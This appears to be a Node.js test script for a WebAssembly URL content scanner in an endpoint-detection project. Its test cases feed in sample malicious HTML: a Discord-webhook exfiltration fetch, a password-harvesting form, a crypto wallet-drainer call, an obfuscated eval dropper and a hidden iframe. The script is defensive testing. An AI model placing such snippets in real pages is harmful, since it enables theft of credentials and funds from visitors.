const fs = require('fs');
const path = require('path');

global.window = global;
global.self = global;

require(path.resolve('docs/openedr_web.js'));

async function testContentScanning() {
  const wasmBytes = fs.readFileSync('docs/openedr_web_bg.wasm');
  const wasm = await wasm_bindgen({ module_or_path: wasmBytes });

  function inspectUrlContent(url, livenessCode = 1, content = null) {
    const encUrl = new TextEncoder().encode(url);
    const pUrl = wasm.web_alloc(encUrl.length);
    new Uint8Array(wasm.memory.buffer, pUrl, encUrl.length).set(encUrl);

    let pContent = 0;
    let lenContent = 0;
    if (content) {
      const encContent = new TextEncoder().encode(content);
      pContent = wasm.web_alloc(encContent.length);
      new Uint8Array(wasm.memory.buffer, pContent, encContent.length).set(encContent);
      lenContent = encContent.length;
    }

    const outPtr = wasm.web_inspect_url_content(pUrl, encUrl.length, livenessCode, pContent, lenContent);
    const outLen = wasm.web_output_len();
    const rep = JSON.parse(new TextDecoder().decode(new Uint8Array(wasm.memory.buffer, outPtr, outLen)));

    wasm.web_free(pUrl, encUrl.length);
    if (pContent) wasm.web_free(pContent, lenContent);
    wasm.web_free(outPtr);
    return rep;
  }

  console.log('--- TEST 1: Clean URL with no content ---');
  const t1 = inspectUrlContent('https://example.com');
  console.log('Verdict:', t1.verdict, '| Reason:', t1.verdict_reason);

  console.log('\n--- TEST 2: Content with Exfiltration Webhook ---');
  const t2 = inspectUrlContent('https://innocent-looking-site.com', 1, '<html><body><script>fetch("https://discord.com/api/webhooks/999888777/xyz123_token")</script></body></html>');
  console.log('Verdict:', t2.verdict, '| Score:', t2.risk_score, '| Hits:', t2.detections.map(d => d.rule_id));

  console.log('\n--- TEST 3: Content with Credential Harvesting Password Form ---');
  const t3 = inspectUrlContent('https://benign-blog.org', 1, '<form action="https://formspree.io/f/xyz"><input type="password" name="pwd"/><button>Submit</button></form>');
  console.log('Verdict:', t3.verdict, '| Score:', t3.risk_score, '| Hits:', t3.detections.map(d => d.rule_id));

  console.log('\n--- TEST 4: Content with Web3 Crypto Wallet Drainer ---');
  const t4 = inspectUrlContent('https://free-crypto-mint.net', 1, '<script>window.ethereum.request({method: "eth_sendTransaction", params: [...]});</script>');
  console.log('Verdict:', t4.verdict, '| Score:', t4.risk_score, '| Hits:', t4.detections.map(d => d.rule_id));

  console.log('\n--- TEST 5: Content with Obfuscated eval/unescape Dropper ---');
  const t5 = inspectUrlContent('https://download-helper.cc', 1, '<script>eval(unescape("%75%6E%65%73%63%61%70%65"));</script>');
  console.log('Verdict:', t5.verdict, '| Score:', t5.risk_score, '| Hits:', t5.detections.map(d => d.rule_id));

  console.log('\n--- TEST 6: Content with Hidden Iframe ---');
  const t6 = inspectUrlContent('https://safe-portal.com', 1, '<iframe src="http://payload-server.xyz" style="display:none;width:0;height:0"></iframe>');
  console.log('Verdict:', t6.verdict, '| Score:', t6.risk_score, '| Hits:', t6.detections.map(d => d.rule_id));
}

testContentScanning().catch(console.error);
